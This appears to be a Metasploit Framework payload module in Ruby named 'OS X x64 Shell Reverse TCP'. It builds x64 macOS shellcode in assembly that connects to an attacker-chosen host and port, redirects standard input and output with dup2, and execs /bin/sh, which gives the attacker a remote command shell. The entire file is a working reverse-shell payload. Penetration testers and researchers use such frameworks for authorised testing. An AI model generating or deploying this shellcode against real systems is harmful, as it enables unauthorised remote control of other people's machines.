##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule

  CachedSize = 128

  include Msf::Payload::Single
  include Msf::Payload::Osx
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(
      merge_info(
        info,
        'Name' => 'OS X x64 Shell Reverse TCP',
        'Description' => 'Connect back to attacker and spawn a command shell',
        'Author' => 'nemo <nemo[at]felinemenace.org>',
        'License' => MSF_LICENSE,
        'Platform' => 'osx',
        'Arch' => ARCH_X64,
        'Handler' => Msf::Handler::ReverseTcp,
        'Session' => Msf::Sessions::CommandShellUnix
      )
    )

    # exec payload options
    register_options(
      [
        OptString.new('CMD', [ true, 'The command string to execute', '/bin/sh' ]),
        Opt::LHOST,
        Opt::LPORT(4444)
      ]
    )
  end

  # build the shellcode payload dynamically based on the user-provided CMD
  def generate
    lhost = datastore['LHOST'] || '127.0.0.1'
    # OptAddress allows either an IP or hostname, we only want IPv4
    unless Rex::Socket.is_ipv4?(lhost)
      raise ArgumentError, 'LHOST must be in IPv4 format.'
    end

    cmd = (datastore['CMD'] || '') + "\x00"
    encoded_port = [datastore['LPORT'].to_i, 2].pack('vn').unpack1('N')
    encoded_host = Rex::Socket.addr_aton(lhost).unpack1('V')
    encoded_host_port = format('0x%.8x%.8x', encoded_host, encoded_port)

    shell_asm = %(
      mov eax,0x2000061
      push 0x2
      pop rdi
      push 0x1
      pop rsi
      xor rdx,rdx
      syscall
      mov r12,rax
      mov rdi,rax
      mov eax,0x2000062
      xor rsi,rsi
      push rsi
      mov rsi, #{encoded_host_port}
      push rsi
      mov rsi,rsp
      push 0x10
      pop rdx
      syscall
      mov rdi,r12
      mov eax,0x200005a
      mov rsi,2
      syscall
      mov eax,0x200005a
      mov rsi,1
      syscall
      mov eax,0x200005a
      mov rsi,0
      syscall
      xor rax,rax
      mov eax,0x200003b
      call load_cmd
      db "#{cmd}", 0x00
    load_cmd:
      pop rdi
      xor rdx,rdx
      push rdx
      push rdi
      mov rsi,rsp
      syscall
    )

    Metasm::Shellcode.assemble(Metasm::X64.new, shell_asm).encode_string
  end
end
